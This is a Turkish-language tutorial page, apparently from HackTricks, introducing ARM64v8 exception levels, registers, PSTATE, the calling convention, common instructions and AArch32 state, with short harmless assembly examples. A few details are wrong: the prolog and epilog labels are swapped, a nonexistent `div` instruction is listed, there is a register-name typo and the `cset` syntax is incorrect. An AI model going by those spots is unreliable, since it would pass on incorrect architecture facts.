# ARM64v8'ye Giriş

{{#include ../../../banners/hacktricks-training.md}}


## **İstisna Seviyeleri - EL (ARM64v8)**

ARMv8 mimarisinde, yürütme seviyeleri Exception Levels (EL) olarak bilinir ve yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. Dört istisna seviyesi vardır, EL0'dan EL3'e kadar, her biri farklı bir amaç hizmet eder:

1. **EL0 - Kullanıcı Modu**:
- Bu en az ayrıcalıklı seviyedir ve normal uygulama kodunu yürütmek için kullanılır.
- EL0'da çalışan uygulamalar birbirinden ve sistem yazılımından izole edilmiştir; bu da güvenliği ve kararlılığı artırır.
2. **EL1 - İşletim Sistemi Kernel Modu**:
- Çoğu işletim sistemi kernel'i bu seviyede çalışır.
- EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır. EL0'dan EL1'e geçmek için `SVC` instrukyonu kullanılır.
3. **EL2 - Hypervisor Modu**:
- Bu seviye sanallaştırma için kullanılır. EL2'de çalışan bir hypervisor aynı fiziksel donanım üzerinde birden fazla işletim sistemini (her biri kendi EL1'inde) yönetebilir.
- EL2, sanallaştırılmış ortamların izolasyonu ve kontrolü için özellikler sağlar.
- Bu yüzden Parallels gibi sanal makine uygulamaları `hypervisor.framework`'ü kullanarak EL2 ile etkileşime girip kernel uzantılarına ihtiyaç duymadan sanal makineler çalıştırabilir.
- EL1'den EL2'ye geçiş için `HVC` instrukyonu kullanılır.
4. **EL3 - Secure Monitor Modu**:
- Bu en ayrıcalıklı seviyedir ve genellikle güvenli önyükleme ve trust edilmiş yürütme ortamları için kullanılır.
- EL3, güvenli ve güvensiz durumlar arasındaki erişimleri (ör. secure boot, trusted OS vb.) yönetip kontrol edebilir.
- macOS'ta KPP (Kernel Patch Protection) için kullanıldı, ancak artık kullanılmıyor.
- Apple tarafından artık EL3 kullanılmamaktadır.
- EL3'e geçiş genellikle `SMC` (Secure Monitor Call) instrukyonu ile yapılır.

Bu seviyelerin kullanımı, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımına kadar sistemin farklı yönlerini yapılandırılmış ve güvenli bir şekilde yönetmeyi sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkin şekilde izole ederek sistemin güvenliğini ve sağlamlığını artırır.

## **Kayıtlar (ARM64v8)**

ARM64'te **31 genel amaçlı kayıt** vardır, `x0` ile `x30` arasında etiketlenmiştir. Her biri **64-bit** (8 bayt) bir değeri depolayabilir. Sadece 32-bit değerler gerektiren işlemler için aynı kayıtlara 32-bit modu kullanılarak `w0` ile `w30` adlarıyla erişilebilir.

1. **`x0`** ile **`x7`** - Bu genellikle geçici (scratch) kayıtlarıdır ve alt rutinlere parametre geçmek için kullanılır.
- **`x0`** ayrıca bir fonksiyonun dönüş verisini taşır.
2. **`x8`** - Linux kernel'de, `x8` `svc` instrukyonu için sistem çağrısı numarası olarak kullanılır. **macOS'te x16 kullanılan kayıttır!**
3. **`x9`** ile **`x15`** - Daha fazla geçici kayıt; genellikle yerel değişkenler için kullanılır.
4. **`x16`** ve **`x17`** - **Intra-procedural Call Registers**. Anlık değerler için geçici kayıtlardır. Ayrıca dolaylı fonksiyon çağrıları ve PLT (Procedure Linkage Table) stub'ları için kullanılırlar.
- **`x16`** macOS'te **`svc`** instrukyonu için **sistem çağrısı numarası** olarak kullanılır.
5. **`x18`** - **Platform register**. Genel amaçlı kayıt olarak kullanılabilir, ancak bazı platformlarda bu kayıt platforma özgü kullanımlar için ayrılmıştır: Windows'ta mevcut thread environment block'a işaretçi veya linux kernel'de şu anda **çalışan task yapısına** işaretçi gibi.
6. **`x19`** ile **`x28`** - Bunlar callee-saved (çağrılan tarafından korunması gereken) kayıtlardır. Bir fonksiyon bu kayıtların değerlerini caller için korumalıdır; bu yüzden bunlar stack'e kaydedilir ve caller'a geri dönmeden önce geri yüklenir.
7. **`x29`** - **Frame pointer**, yığın frame'ini takip etmek için. Yeni bir çağrı nedeniyle yeni bir yığın frame'i oluşturulduğunda, **`x29`** kaydı **stack'e saklanır** ve yeni frame pointer adresi (yani **`sp`** adresi) bu kayıtta tutulur.
- Bu kayıt aynı zamanda **genel amaçlı** bir kayıt olarak da kullanılabilir, ancak genellikle **yerel değişkenlere** referans olarak kullanılır.
8. **`x30`** veya **`lr`** - **Link register**. `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) instruksyonu yürütüldüğünde **geri dönüş adresini** tutar ve bu amaçla **`pc`** değeri bu kayıt içine saklanır.
- Diğer kayıtlar gibi kullanılabilir.
- Eğer mevcut fonksiyon yeni bir fonksiyon çağırıp `lr`'yi üzerine yazacaksa, başlangıçta `lr` yığın içine kaydedilir; bu epilogdur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi sakla, alan oluştur ve yeni `fp` al) ve sonunda geri yüklenir; bu prologdur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi geri yükle ve dön).
9. **`sp`** - **Stack pointer**, yığının tepesini takip etmek için kullanılır.
- **`sp`** değeri her zaman en az bir **quadword** hizalamasında tutulmalıdır, aksi halde hizalama istisnası oluşabilir.
10. **`pc`** - **Program counter**, bir sonraki instruksyona işaret eder. Bu kayıt yalnızca istisna oluşumları, istisna dönüşleri ve dallanmalar yoluyla güncellenebilir. Bu kaydı okuyabilen olağan instruksyonlar sadece link ile dallanma instruksyonlarıdır (BL, BLR) ve bunlar `pc` adresini `lr`'ye (Link Register) saklar.
11. **`xzr`** - **Sıfır kayıt**. 32-bit formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca elde etmek için (yaygın işlem) veya `subs` gibi karşılaştırmalar yapmak için kullanılabilir: **`subs XZR, Xn, #10`** sonucu hiçbir yere saklamadan (yani **`xzr`** içinde) kullanmak gibi.

**`Wn`** kayıtları **`Xn`** kaydının **32-bit** sürümüdür.

> [!TIP]
> X0 - X18 arasındaki kayıtlar volatility (geçici) özelliğe sahiptir; yani fonksiyon çağrıları ve interrupt'lar bu kayıtların değerlerini değiştirebilir. Ancak X19 - X28 arasındaki kayıtlar non-volatile'dır; bu yüzden bu değerlerin fonksiyon çağrıları boyunca korunması gerekir ("callee saved").

### SIMD ve Floating-Point Kayıtları

Ayrıca, optimize edilmiş single instruction multiple data (SIMD) işlemlerinde ve kayan nokta aritmetiğinde kullanılabilen **128-bit uzunlukta başka 32 kayıt** vardır. Bunlar Vn kayıtları olarak adlandırılır; ayrıca **64**, **32**, **16** ve **8** bit modlarında çalıştırılabilirler ve o zaman **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.

### Sistem Kayıtları

**Yüzlerce sistem kaydı** vardır; bunlar özel amaçlı kayıtlar (SPRs) olarak da adlandırılır ve **işlemci davranışını izlemek ve kontrol etmek** için kullanılır.\
Yalnızca özel instruksyonlar **`mrs`** ve **`msr`** ile okunup yazılabilirler.

Özel kayıtlar **`TPIDR_EL0`** ve **`TPIDDR_EL0`** tersine mühendislik sırasında sıkça karşılaşılan kayıtlardır. `EL0` son eki, kayda hangi minimum istisna seviyesinden erişilebileceğini gösterir (bu durumda EL0, normal programların çalıştığı düzenli istisna (ayrıcalık) seviyesidir).\
Genellikle thread-local storage bölgesinin taban adresini depolamak için kullanılırlar. Genelde ilk kayıt EL0'da çalışan programlar tarafından okunup yazılabilirken, ikincisi EL0'den okunabilir ve EL1'den (kernel gibi) yazılabilir.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**, işletim sistemi tarafından görülebilen **`SPSR_ELx`** özel kaydına seri hale getirilmiş birkaç işlem bileşeni içerir; burada X tetiklenen istisnanın **izin (permission)** seviyesidir (bu, istisna sona erdiğinde süreç durumunun geri yüklenmesini sağlar).\
Erişilebilir alanlar şunlardır:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** ve **`V`** durum (condition) bayrakları:
- **`N`** işlemin negatif sonuç verdiğini gösterir
- **`Z`** işlemin sıfır verdiğini gösterir
- **`C`** işlemin taşıma (carry) oluşturduğunu gösterir
- **`V`** işlemin işaretli taşma (signed overflow) verdiğini gösterir:
- İki pozitif sayının toplamı negatif bir sonuç veriyorsa.
- İki negatif sayının toplamı pozitif bir sonuç veriyorsa.
- Çıkarma işleminde, büyük negatif bir sayı daha küçük pozitif bir sayından (veya tam tersi) çıkarıldığında ve sonuç verilen bit aralığında temsil edilemiyorsa.
- İşlemcinin işlemin işaretli mi işaretsiz mi olduğunu bilmediği açıktır; bu yüzden taşıma ve taşma (C ve V) bayraklarını kontrol eder ve taşma olup olmadığını buna göre belirtir.

> [!WARNING]
> Tüm instruksyonlar bu bayrakları güncellemez. Bazıları (**`CMP`**, **`TST`**) günceller ve s eki olan instruksyonlar (**`ADDS`** gibi) da günceller.

- Mevcut **kayıt genişliği (`nRW`) bayrağı**: Bayrak 0 ise, program devam ettiğinde AArch64 yürütme durumunda çalışacaktır.
- Mevcut **İstisna Seviyesi** (**`EL`**): EL0'da çalışan normal bir program için bu değer 0 olur.
- **Tek adımlama (single stepping)** bayrağı (**`SS`**): Debugger'lar tarafından bir istisna içinde **`SPSR_ELx`** içine SS bayrağı 1 yapılarak tek adım atma için kullanılır. Program bir adım çalışır ve tek adım istisnası oluşturur.
- **Yasadışı istisna** durum bayrağı (**`IL`**): Ayrıcalıklı yazılımın geçersiz bir istisna seviyesi transferi gerçekleştirdiğini işaretlemek için kullanılır; bu bayrak 1 olarak ayarlanır ve işlemci yasadışı durum istisnası tetikler.
- **`DAIF`** bayrakları: Bu bayraklar, ayrıcalıklı bir programa belirli dış istisnaları seçici olarak maskeleme imkanı verir.
- Eğer **`A`** 1 ise asenkron abort'lar tetiklenecektir. **`I`** harici donanım Interrupt Requests (IRQ) yanıtlamasını yapılandırır. `F` ise Fast Interrupt Requests (FIQ) ile ilgilidir.
- **Yığın işaretçisi seçimi** bayrakları (**`SPS`**): EL1 ve üzeri ayrıcalıklı programlar kendi stack pointer kayıtları ile kullanıcı modeli stack pointer arasında geçiş yapabilirler (ör. `SP_EL1` ve `EL0` arasında). Bu geçiş **`SPSel`** özel kaydına yazılarak yapılır. Bu EL0'dan yapılamaz.

## **Çağrı Konvansiyonu (ARM64v8)**

ARM64 çağrı konvansiyonu, bir fonksiyona geçirilen **ilk sekiz parametrenin** `x0` ile `x7` kayıtlarında taşınacağını belirtir. **Ek** parametreler **stack** üzerinde geçirilir. **Dönüş** değeri `x0` kaydında geri verilir; eğer dönüş 128 bit ise ayrıca `x1` de kullanılır. **`x19`** ile **`x30`** ve **`sp`** kayıtlarının fonksiyon çağrıları boyunca **korunması** gerekir.

Assembly'de bir fonksiyonu okurken, **fonksiyon prologu ve epilogu**na dikkat edin. **Prolog** genellikle **link register (`x30`)** ve **frame pointer (`x29`)**'ın saklanmasını, yeni bir frame pointer kurulmasını ve yığın alanı ayrılmasını içerir. **Epilog** ise genellikle saklanan frame pointer'ın geri yüklenmesini ve fonksiyondan dönüşü içerir.

### Swift'te Çağrı Konvansiyonu

Swift kendi **çağrı konvansiyonuna** sahiptir; bunu şu adreste bulabilirsiniz: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Yaygın Instruksyonlar (ARM64v8)**

ARM64 instruksyonları genellikle **`opcode dst, src1, src2`** formatına sahiptir; burada **`opcode`** yapılacak işlemi (ör. `add`, `sub`, `mov` vb.), **`dst`** sonucu saklayacak hedef kayıtı ve **`src1`**, **`src2`** kaynak kayıtlarıdır. Kaynak kayıtların yerine immediate değerler de kullanılabilir.

- **`mov`**: Bir değeri bir **kayıttan** diğerine **taşır**.
- Örnek: `mov x0, x1` — Bu `x1`'deki değeri `x0`'a taşır.
- **`ldr`**: Bir değeri **hafızadan** bir **kayıta** **yükler**.
- Örnek: `ldr x0, [x1]` — Bu `x1` tarafından işaret edilen hafıza konumundan bir değeri `x0`'a yükler.
- **Offset modu**: Orijin pointer'ı etkileyen bir offset şöyle belirtilir:
- `ldr x2, [x1, #8]`, bu x2'ye x1 + 8 adresinden değeri yükler
- `ldr x2, [x0, x1, lsl #2]`, bu x2'ye x0 dizisinden x1 (indeks) * 4 konumundaki nesneyi yükler
- **Pre-indexed modu**: Bu orijine hesaplamaları uygular, sonucu alır ve ayrıca yeni orijini orijine yazar.
- `ldr x2, [x1, #8]!`, bu `x1 + 8`'i `x2`'ye yükler ve x1'e `x1 + 8` sonucunu yazar
- `str lr, [sp, #-4]!`, Link register'ı sp'ye kaydet ve sp'yi güncelle
- **Post-index modu**: Bu önce bellek adresine erişir, sonra offset hesaplanır ve saklanır.
- `ldr x0, [x1], #8`, x1'i x0'a yükle ve x1'i `x1 + 8` ile güncelle
- **PC-relative addressing**: Bu durumda yüklenecek adres PC kaydına göre hesaplanır
- `ldr x1, =_start`, Bu mevcut PC'ye göre `_start` sembolünün başladığı adresi x1'e yükler.
- **`str`**: Bir değeri **kaydeden** kayıttan **hafızaya** **saklar**.
- Örnek: `str x0, [x1]` — Bu `x0` içindeki değeri `x1` tarafından işaret edilen hafıza konumuna yazar.
- **`ldp`**: İki kaydın **çift yüklenmesi**. Bu instruksyon **ardışık hafıza** konumlarından iki kaydı yükler. Hafıza adresi tipik olarak başka bir kaydın değerine bir offset eklenerek oluşturulur.
- Örnek: `ldp x0, x1, [x2]` — Bu `x2` ve `x2 + 8` adreslerindeki hafıza konumlarından `x0` ve `x1`'i yükler.
- **`stp`**: İki kaydın **çift saklanması**. Bu instruksyon iki kaydı ardışık hafıza konumlarına yazar.
- Örnek: `stp x0, x1, [sp]` — Bu `x0` ve `x1`'i `sp` ve `sp + 8` konumlarına yazar.
- `stp x0, x1, [sp, #16]!` — Bu `x0` ve `x1`'i `sp+16` ve `sp + 24` konumlarına yazar ve `sp`'yi `sp+16` ile günceller.
- **`add`**: İki kaydın değerini toplar ve sonucu bir kayıtta saklar.
- Söz dizimi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Hedef
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (kayıt veya immediate)
- \[shift #N | RRX] -> Bir kaydırma uygula veya RRX çağır
- Örnek: `add x0, x1, x2` — Bu `x1` ve `x2` değerlerini toplar ve sonucu `x0`'a yazar.
- `add x5, x5, #1, lsl #12` — Bu 4096'ya eşittir (1'i 12 kez sola kaydırmak) -> 1 0000 0000 0000 0000
- **`adds`**: `add` yapar ve bayrakları günceller
- **`sub`**: İki kaydın değerini çıkarır ve sonucu bir kayıtta saklar.
- `add` söz dizimine bakın.
- Örnek: `sub x0, x1, x2` — Bu `x1`'den `x2`'yi çıkarır ve sonucu `x0`'a yazar.
- **`subs`**: `sub` ile aynı ama bayrakları günceller
- **`mul`**: İki kaydın değerini çarpar ve sonucu bir kayıtta saklar.
- Örnek: `mul x0, x1, x2` — Bu `x1` ve `x2` değerlerini çarpar ve sonucu `x0`'a yazar.
- **`div`**: Bir kaydın değerini diğerine böler ve sonucu bir kayıtta saklar.
- Örnek: `div x0, x1, x2` — Bu `x1` değerini `x2`'ye böler ve sonucu `x0`'a yazar.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Sonuna 0 ekleyerek diğer bitleri öne kaydırır (n kez 2 ile çarpma)
- **Logical shift right**: Başına 0 ekleyerek diğer bitleri geriye kaydırır (işaretsizda n kez 2 ile bölme)
- **Arithmetic shift right**: `lsr` gibidir, ancak en anlamlı bit 1 ise 0 yerine 1'ler ekler (işaretli bölmede n kez 2 ile bölme)
- **Rotate right**: `lsr` gibi ama sağdan çıkan neyse sola eklenir
- **Rotate Right with Extend**: `ror` gibi fakat carry bayrağını en anlamlı bit olarak kullanır. Bu yüzden carry bayrağı bit 31'e taşınır ve çıkarılan bit carry bayrağına yazılır.
- **`bfm`**: **Bit Field Move**, bu işlemler bir değerden `0...n` bitlerini kopyalar ve onları `m..m+n` pozisyonlarına yerleştirir. **`#s`** solmost bit pozisyonunu, **`#r`** ise sağa döndürme miktarını belirtir.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract ve Insert:** Bir kayıt içinden bir bit alanı kopyalar ve başka bir kayda yerleştirir.
- **`BFI X1, X2, #3, #4`** X2'den 4 biti X1'in 3. bitinden itibaren ekler
- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden başlayarak 4 bit çıkarır ve X1'e kopyalar
- **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti işaret uzatma ile X1'e, 3. bitten başlayarak ekler ve sağdaki bitleri sıfırlar
- **`SBFX X1, X2, #3, #4`** X2'den 3. bittan başlayarak 4 biti çıkarır, işaret uzatır ve sonucu X1'e koyar
- **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti sıfır uzatma ile X1'e, 3. bitten başlayarak ekler ve sağdaki bitleri sıfırlar
- **`UBFX X1, X2, #3, #4`** X2'den 3. bittan başlayarak 4 biti çıkarır ve sıfır uzatılmış sonucu X1'e koyar.
- **Sign Extend To X:** Bir değerin işaretini genişletir (veya işaretsizde sadece 0'lar ekler) böylece onunla işlem yapabilmeyi sağlar:
- **`SXTB X1, W2`** Bir byte'ın işaretini **W2'den X1'e** genişletir (`W2`, `X2`'nin yarısıdır) ve 64 biti doldurur
- **`SXTH X1, W2`** 16-bit sayının işaretini **W2'den X1'e** genişletir ve 64 biti doldurur
- **`SXTW X1, W2`** Bir kelimenin işaretini **W2'den X1'e** genişletir ve 64 biti doldurur
- **`UXTB X1, W2`** Bir byte'ı **W2'den X1'e** sıfırlarla genişletir (işaretsiz) ve 64 biti doldurur
- **`extr`:** Belirtilen iki kaydın birleştirilmiş çiftinden bitleri çıkarır.
- Örnek: `EXTR W3, W2, W1, #3` Bu `W1+W2`'yi birleştirir ve **W2'nin 3. bitinden W1'in 3. bitine kadar** alır ve W3'e koyar.
- **`cmp`**: İki kaydı karşılaştırır ve durum bayraklarını ayarlar. `subs`'ın bir alias'ıdır ve hedef kaydı sıfır kaydı olarak ayarlar. `m == n` olup olmadığını bilmek için kullanışlıdır.
- `subs` ile aynı söz dizimini destekler.
- Örnek: `cmp x0, x1` — Bu `x0` ve `x1` değerlerini karşılaştırır ve durum bayraklarını ayarlar.
- **`cmn`**: Negatif operand ile karşılaştırma. Bu `adds`'in bir alias'ıdır ve aynı söz dizimini destekler. `m == -n` olup olmadığını bilmek için faydalıdır.
- **`ccmp`**: Koşullu karşılaştırma; önceki karşılaştırma doğruysa yapılacak ve özellikle `nzcv` bitlerini ayarlayacak bir karşılaştırmadır.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise func'a atla
- Bunun nedeni, **`ccmp`** sadece önceki `cmp`'in `NE` olduğu durumda çalıştırılacaktır; değilse `nzcv` bitleri 0 olarak ayarlanır (bu da `blt` karşılaştırmasını sağlamaz).
- Bu, `ccmn` olarak da kullanılabilir (aynı ama negatif, `cmp` vs `cmn` gibi).
- **`tst`**: Karşılaştırma değerlerinden herhangi birinin 1 olup olmadığını kontrol eder (sonucu herhangi bir yere saklamadan bir ANDS gibi çalışır). Bir kaydı bir değerle kontrol etmek ve kaydın belirtilen bitlerinden herhangi birinin 1 olup olmadığını kontrol etmek için kullanışlıdır.
- Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol et.
- **`teq`**: XOR işlemini sonucu atmadan yapar.
- **`b`**: Koşulsuz branch
- Örnek: `b myFunction`
- Bu `lr`'yi geri dönüş adresi ile doldurmaz (geri dönmesi gereken alt rutin çağrıları için uygun değildir)
- **`bl`**: **Branch** with link, bir **alt rutin** çağırmak için kullanılır. **Geri dönüş adresini `x30`**'a saklar.
- Örnek: `bl myFunction` — Bu `myFunction`'ı çağırır ve geri dönüş adresini `x30`'a saklar.
- **`blr`**: Register'e Link ile Branch; hedef bir kayıt içinde belirtildiğinde kullanılan alt rutin çağrısı. Geri dönüş adresini `x30`'a saklar.
- Örnek: `blr x1` — Bu `x1`'deki adrese sahip fonksiyonu çağırır ve geri dönüş adresini `x30`'a saklar.
- **`ret`**: Alt rutinden dönüş, tipik olarak `x30` içindeki adresi kullanır.
- Örnek: `ret` — Bu mevcut alt rutin'den `x30` içindeki geri dönüş adresi ile döner.
- **`b.<cond>`**: Koşullu dallanmalar
- **`b.eq`**: Eşitse dallan (previous `cmp`'e bağlı).
- Örnek: `b.eq label` — Eğer önceki `cmp` iki değeri eşit bulduysa `label`'a atlar.
- **`b.ne`**: Eşit değilse dallan. Bu instruksyon koşul bayraklarını kontrol eder ve karşılaştırılan değerler eşit değilse bir etiket veya adrese dallanır.
- Örnek: `cmp x0, x1` sonrası `b.ne label` — Eğer `x0` ve `x1` eşit değilse `label`'a atlar.
- **`cbz`**: Sıfırla karşılaştır ve sıfırsa dallan. Bir kaydı sıfır ile karşılaştırır ve eşitse bir etikete atlar.
- Örnek: `cbz x0, label` — Eğer `x0` sıfırsa `label`'a atlar.
- **`cbnz`**: Sıfır olmayan ile karşılaştır ve sıfır değilse dallan.
- Örnek: `cbnz x0, label` — Eğer `x0` sıfır değilse `label`'a atlar.
- **`tbnz`**: Bit test et ve sıfır olmayan durumda dallan
- Örnek: `tbnz x0, #8, label`
- **`tbz`**: Bit test et ve sıfır ise dallan
- Örnek: `tbz x0, #8, label`
- **Koşullu seçme işlemleri**: Davranışı koşul bitlerine bağlı olarak değişen işlemlerdir.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Eğer doğruysa X0 = X1, yanlışsa X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Eğer doğruysa Xd = Xn, yanlışsa Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Eğer doğruysa Xd = Xn + 1, değilse Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Eğer doğruysa Xd = Xn, değilse Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Eğer doğruysa Xd = NOT(Xn), değilse Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Eğer doğruysa Xd = Xn, değilse Xd = - Xm
- `cneg Xd, Xn, cond` -> Eğer doğruysa Xd = - Xn, değilse Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Eğer doğruysa Xd = 1, değilse Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Eğer doğruysa Xd = \<all 1>, değilse Xd = 0
- **`adrp`**: Bir sembolün **sayfa adresini** hesaplar ve bir kayda saklar.
- Örnek: `adrp x0, symbol` — `symbol`'ün sayfa adresini hesaplar ve `x0`'a koyar.
- **`ldrsw`**: Hafızadan işaretli **32-bit** bir değeri *yükler* ve **64** bite işaret genişlemesi yapar. Bu yaygın SWITCH vakalarında kullanılır.
- Örnek: `ldrsw x0, [x1]` — Bu `x1` tarafından işaret edilen hafıza konumundan işaretli 32-bit bir değeri yükler, 64 bite genişletir ve `x0`'a koyar.
- **`stur`**: Bir kaydın değerini başka bir kaydın offsetsi kullanılarak bir hafıza konumuna **saklar**.
- Örnek: `stur x0, [x1, #4]` — Bu `x0` içindeki değeri `x1` adresinden 4 bayt ilerideki hafıza adresine yazar.
- **`svc`** : Bir **system call** yapar. "Supervisor Call" anlamına gelir. Bu instruksyon yürütüldüğünde işlemci **user modundan kernel moduna geçer** ve kernel'in system call işleme kodunun bulunduğu belirli bir bellek konumuna atlar.

- Örnek:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Fonksiyon Prologu**

1. **Link register ve frame pointer'ı stack'e sakla**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Yeni çerçeve işaretçisini ayarla**: `mov x29, sp` (mevcut fonksiyon için yeni çerçeve işaretçisini ayarlar)
3. **Yerel değişkenler için stack üzerinde alan ayır** (gerekirse): `sub sp, sp, <size>` (burada `<size>` gerekli byte sayısıdır)

### **Fonksiyon Epilogu**

1. **Yerel değişkenleri (eğer ayrıldıysa) serbest bırak**: `add sp, sp, <size>`
2. **Link register ve çerçeve işaretçisini geri yükle**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (kontrolü, link register içindeki adresi kullanarak çağırana geri verir)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A, 32-bit programların yürütülmesini destekler. **AArch32** **iki farklı instruction setinden** birinde çalışabilir: **`A32`** ve **`T32`** ve aralarında **`interworking`** ile geçiş yapabilir.\
**Ayrıcalıklı** 64-bit programlar, daha düşük ayrıcalığa sahip 32-bit programların yürütülmesini, istisna seviyesi transferi (exception level transfer) yaparak planlayabilirler.\
64-bit'ten 32-bit'e geçişin istisna seviyesinin daha düşük olmasıyla gerçekleştiğini unutmayın (örneğin EL1'deki bir 64-bit programın EL0'da bir programı tetiklemesi). Bu, `AArch32` işlem iş parçacığı yürütülmeye hazır olduğunda özel register olan **`SPSR_ELx`**'in **bit 4'ünün** **1 olarak ayarlanması** ve `SPSR_ELx`'in geri kalanının `AArch32` programının CPSR'sini depolamasıyla yapılır. Ardından, ayrıcalıklı süreç **`ERET`** komutunu çağırır ve işlemci **`AArch32`**'ye geçerek CPSR'ye bağlı olarak A32 veya T32'ye girer.**

**`interworking`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0` **`A32`** anlamına gelirken `J=0` ve `T=1` **T32** anlamına gelir. Bu temelde instruction set'in T32 olduğunu göstermek için **en düşük bitin 1 olarak ayarlanması** demektir.\
Bu, **interworking branch instruction'ları** sırasında ayarlanır, ancak PC hedef register olarak ayarlandığında diğer instruksyonlarla doğrudan da ayarlanabilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Kayıtlar

16 adet 32-bit kayıt (r0-r15) vardır. **r0 ile r14 arası** herhangi bir işlem için kullanılabilir, ancak bazıları genellikle ayrılmıştır:

- **`r15`**: Program counter (her zaman). Bir sonraki komutun adresini içerir. A32'de current + 8, T32'de current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Not: stack her zaman 16-byte hizalanmıştır)
- **`r14`**: Link Register

Ayrıca, kayıtlar **`banked registries`** içinde yedeklenir. Buralar, exception handling ve ayrıcalıklı operasyonlarda **hızlı context switching** yapmak için kayıt değerlerini saklayan yerlerdir; böylece her seferinde kayıtları elle kaydetme ve geri yükleme ihtiyacı ortadan kalkar.\
Bu, istisnaya alınan işlemci modunun durumunu **`CPSR`'den `SPSR`'ye kaydetmek** suretiyle yapılır. Exception dönüşlerinde, **`CPSR`** **`SPSR`**'den geri yüklenir.

### CPSR - Current Program Status Register

AArch32'de CPSR, AArch64'teki **`PSTATE`**'e benzer çalışır ve bir exception alındığında daha sonra yürütmeyi geri yüklemek için **`SPSR_ELx`** içinde saklanır:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Alanlar bazı gruplara ayrılır:

- Application Program Status Register (APSR): Aritmetik bayraklar ve EL0'dan erişilebilir
- Execution State Registers: İşlemci davranışı (OS tarafından yönetilir).

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** bayrakları (AArch64'teki gibi)
- **`Q`** bayrağı: Özelleşmiş doygunlaştırıcı aritmetik bir talimatın yürütülmesi sırasında **tam sayı doygunluğu** oluştuğunda 1 olur. Bir kez **`1`** yapıldığında, elle 0'a ayarlanana kadar değeri korunur. Ayrıca, değeri dolaylı olarak kontrol eden bir talimat yoktur; değeri okumak için manuel olarak okunmalıdır.
- **`GE`** (Greater than or equal) Bayrakları: SIMD (Single Instruction, Multiple Data) işlemlerinde kullanılır; örneğin "parallel add" ve "parallel subtract" gibi. Bu işlemler tek bir talimatta birden fazla veri noktasını işlemeye olanak sağlar.

Örneğin, **`UADD8`** talimatı iki 32-bit operandan dört çift baytı paralel olarak toplar ve sonuçları 32-bit bir kayıtta saklar. Ardından bu sonuçlara göre **`APSR`** içindeki `GE` bayraklarını ayarlar. Her bir GE bayrağı, o bayt çiftinin toplamasının **taşma** yaşayıp yaşamadığını gösterir.

**`SEL`** talimatı bu GE bayraklarını kullanarak koşullu eylemler gerçekleştirir.

#### Execution State Registers

- **`J`** ve **`T`** bitleri: **`J`** 0 olmalıdır; eğer **`T`** 0 ise A32 talimat seti kullanılır, 1 ise T32 kullanılır.
- IT Block State Register (`ITSTATE`): 10-15 ve 25-26 bitleridir. **`IT`** önekiyle başlayan bir grup içindeki talimatlar için koşulları saklar.
- **`E`** biti: Endianness'i belirtir.
- Mode ve Exception Mask Bitleri (0-4): Mevcut yürütme durumunu belirler. 5. bit programın 32bit (1) mi yoksa 64bit (0) mı olarak çalıştığını gösterir. Diğer dört bit, **şu anda kullanılan exception modunu** temsil eder (bir exception oluştuğunda ve işlenirken). Ayarlı sayı, bu işleme sırasında başka bir exception tetiklenirse mevcut önceliği belirtir.

